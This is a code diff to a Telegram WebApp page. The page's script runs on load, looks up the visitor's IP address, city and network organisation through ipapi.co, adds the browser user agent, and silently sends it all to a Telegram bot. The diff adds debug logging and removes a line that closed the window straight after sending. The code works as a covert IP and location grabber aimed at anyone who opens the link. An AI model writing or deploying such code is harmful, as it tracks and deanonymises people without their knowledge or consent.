@@ -6,12 +6,11 @@
   <script src="https://telegram.org/js/telegram-web-app.js"></script> <!-- Это ВАЖНО -->
   <script>
     async function sendData() {
-      const tg = window.Telegram.WebApp;
-      tg.ready(); // уведомляем Telegram, что WebApp готов
-
+      console.log("📡 Старт отправки данных...");  // 🔍 Проверка
+  
       const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
       const userAgent = navigator.userAgent;
-
+  
       const payload = {
         ip: ipData.ip,
         city: ipData.city,
@@ -20,11 +19,11 @@
         org: ipData.org,
         ua: userAgent
       };
-
-      tg.sendData(JSON.stringify(payload));
-      tg.close(); // Закрываем окно сразу после отправки
+  
+      console.log("📨 Отправка в Telegram:", payload);  // 🔍 Проверка
+      Telegram.WebApp.sendData(JSON.stringify(payload));
     }
-
+  
     window.onload = sendData;
   </script>
 </head>
